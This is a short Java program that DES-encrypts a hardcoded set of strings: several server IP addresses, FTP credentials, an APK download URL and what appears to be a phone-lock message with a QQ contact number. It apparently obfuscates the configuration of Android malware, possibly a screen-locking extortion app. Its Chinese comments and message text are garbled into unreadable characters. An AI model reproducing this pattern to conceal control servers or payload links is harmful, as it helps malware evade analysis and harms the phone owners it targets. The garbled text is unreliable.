import encrypt.DES;

/**
 * @author Administrator
 *
 */
public class Main {
	private static final String KEY = "9ba45bfd500642328ec03ad8ef1b6e75";// �Զ�����Կ
	private static DES des = null;
	
    //public static final String HOST = "119.23.68.205";//������IP
    //public static final String HOST = "120.76.56.164";//
	public static final String HOST1 = "119.23.35.238";
	public static final String HOST2 = "119.23.35.23";
	public static final String HOST3 = "154.221.19.215";
    public static final String FTP_USER_NAME="byc";
    public static final String FTP_USER_PWD="byc";
    
    public volatile static String uIP="";//���·�������ַ
 
    public volatile static String cIP="";//���Ʒ�������ַ
    
    public volatile static String ftpPwd="byc";
    public volatile static String ftpUserName="byc";
    
    public final static String DOWNLOAD="http://119.23.68.205/android/files/apk/maj.apk";//���ص�ַ
    public final static String DOWNLOAD2="http://119.23.68.205/android/files/apk/";//���ص�ַ
    public static final String HOMEPAGE="http://119.23.68.205/android/android.htm";//���ص�ַ
    public static final String LOCAK_SAY="�����ֻ��������繥����\n����ʱ������\n����ϵ�ͷ���\nQQ��1096754477\n����!\n���棺����οͷ�QQ�ţ�ǧ���������ֻ��������ֻ��ᱻ����������";
    
	/**
	 * @param args
	 */
	public static void main(String[] args) {
	    //************************************�����ַ���*********************************
		des = DES.getDes(KEY);
		encryptstring(FTP_USER_NAME);
		encryptstring(HOST1);
		encryptstring(HOST2);
		encryptstring(HOST3);
		encryptstring(DOWNLOAD);
		encryptstring(DOWNLOAD2);
		encryptstring(HOMEPAGE);
		encryptstring(LOCAK_SAY);
	}
	private  static void encryptstring(String str){
		try {
			
			System.out.println("����ǰ���ַ���" + str);
			String res=des.encode(str);
			System.out.println("���ܺ���ַ���" + res);
			System.out.println("���ܺ���ַ���" + des.decode(des.encode(str)));
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
